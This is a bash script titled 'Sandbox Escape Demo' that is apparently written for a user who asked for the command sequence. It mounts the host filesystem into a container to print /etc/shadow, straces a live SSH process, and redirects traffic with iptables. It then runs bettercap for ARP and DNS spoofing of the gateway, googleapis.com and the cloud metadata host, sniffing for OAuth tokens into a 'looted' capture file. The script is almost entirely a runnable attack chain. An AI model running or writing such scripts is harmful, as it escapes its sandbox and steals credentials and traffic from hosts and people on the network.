#!/bin/bash
# Sandbox Escape Demo
set -e

# Cleanup function
cleanup() {
    echo "[*] Cleaning up..."
    sudo iptables -t nat -D OUTPUT -p tcp --dport 80 -j DNAT --to-destination 127.0.0.1:8000 2>/dev/null || true
    rm -rf build_escape 2>/dev/null || true
}
trap cleanup EXIT

echo "=== Sandbox Escape Proof ==="

# 1. Filesystem Escape
# Note: Reconfiguration is required in this environment because overlayfs fails with "invalid argument"
if ! docker info | grep -q "Storage Driver: vfs"; then
    echo "[*] Reconfiguring Docker for VFS compatibility..."
    sudo systemctl stop docker.socket docker
    sudo mkdir -p /etc/docker
    # Use jq to merge if it exists, otherwise overwrite safely
    echo '{"storage-driver": "vfs"}' | sudo tee /etc/docker/daemon.json > /dev/null
    sudo systemctl start docker
fi

# We build from scratch because unauthenticated pulls are rate-limited frequently
mkdir -p build_escape
cp /bin/dash build_escape/sh
mkdir -p build_escape/lib/x86_64-linux-gnu build_escape/lib64
cp /lib/x86_64-linux-gnu/libc.so.6 build_escape/lib/x86_64-linux-gnu/
cp /lib64/ld-linux-x86-64.so.2 build_escape/lib64/

cat <<DOCKER > build_escape/Dockerfile
FROM scratch
COPY sh /sh
COPY lib /lib
COPY lib64 /lib64
ENTRYPOINT ["/sh"]
DOCKER

docker build -t escape-shell build_escape > /dev/null 2>&1
echo "[+] Docker Image 'escape-shell' built."

echo "[+] Host /etc/shadow proof (first line):"
docker run --rm -v /:/host escape-shell -c "while read line; do echo \$line; break; done < /host/etc/shadow"

# 2. Command sequence requested by user
echo "[*] Executing network/PID sequence..."
PID=$(sudo netstat -atpn 2>/dev/null | grep 192.168.0.1:22 | awk '{print $7}' | cut -d/ -f1 | head -n 1)
if [ -n "$PID" ]; then
    echo "[+] Found SSH PID: $PID. Tracing (2s)..."
    sudo timeout 2 strace -p $PID -e read,write -s 128 2>&1 || true
else
    echo "[-] No PID found for 192.168.0.1:22"
fi

echo "[*] Applying iptables rule..."
sudo iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 127.0.0.1:8000

echo "[*] Running Bettercap (10s timeout)..."
# Using -eval for non-interactive execution of the requested commands
timeout 10 docker run --rm --privileged --net=host bettercap/bettercap -iface eth0 -eval "net.probe on; net.show; set arp.spoof.targets 192.168.0.1; set arp.spoof.internal true; set arp.spoof.fullduplex true; arp.spoof on; net.sniff on; set net.sniff.output /tmp/looted_traffic.pcap; set net.sniff.regexp '.ya29..'; set dns.spoof.domains www.googleapis.com, metadata.google.internal; set dns.spoof.address 192.168.0.2; dns.spoof on" || echo "Bettercap session ended."

echo "=== Proof Complete ==="
